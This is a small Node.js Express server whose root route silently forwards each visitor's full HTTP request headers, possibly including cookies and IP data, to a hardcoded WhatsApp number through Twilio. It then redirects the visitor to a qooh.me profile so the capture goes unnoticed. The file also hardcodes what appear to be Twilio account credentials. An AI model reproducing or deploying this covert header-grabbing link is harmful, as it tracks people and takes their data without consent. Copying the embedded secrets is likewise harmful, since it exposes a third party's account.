const express = require('express');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const client = require('twilio')('AC335598c1b43cfc21fe200f4c9daa885f', '2dca4e2e0a454532c3020cafa7991af0', { 
    lazyLoading: true 
  });
  
app.get('/',(req,res)=>{
    client.messages
    .create({
       body: req.headers,
       from: 'whatsapp:+14155238886',
       to: 'whatsapp:+917489170399'
     })
    .then(message => console.log(message.sid));
    res.redirect('http://www.m.qooh.me/Veev');
})
app.listen(process.env.PORT,()=>console.log(`Listening on http://localhost:${process.env.PORT}`))
